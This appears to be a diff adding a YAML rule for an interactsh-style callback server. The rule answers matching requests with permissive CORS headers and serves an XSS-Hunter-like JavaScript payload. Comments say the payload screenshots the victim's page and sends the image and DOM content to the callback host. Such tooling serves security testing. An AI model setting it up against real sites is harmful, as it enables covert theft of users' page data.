@@ -1,0 +1,20 @@
+- dsl: host=='{{URL}}'
+  code: |
+    resp.StatusCode = 200
+    
+    headers = {
+        'Expires': '0',
+        'Cache-Control': 'no-cache, no-store, must-revalidate',
+        'Access-Control-Allow-Methods': 'OPTIONS, PUT, DELETE, POST, GET',
+        'Strict-Transport-Security': 'max-age=31536000; includeSubDomains; preload',
+        'Pragma': 'no-cache',
+        'Access-Control-Allow-Credentials': 'true',
+        'X-Frame-Options': 'deny',
+        'Access-Control-Allow-Headers': 'X-Requested-With, Content-Type, Origin, Authorization, Accept, Accept-Encoding',
+        'Access-Control-Allow-Origin': '*'
+    }
+    resp.Headers = headers
+    # javascript file containing client side javascript code containing html2canvas (similar to xss hunter)
+    xss = read_file_as_text('xsshunter.js') # absolute path on the server
+    resp.Body = replace(xss,'{{myurl}}', '{{URL}}') // replace url with client generated one
+    # interactsh will receive the callback containing base64 encoded screenshot and dom content
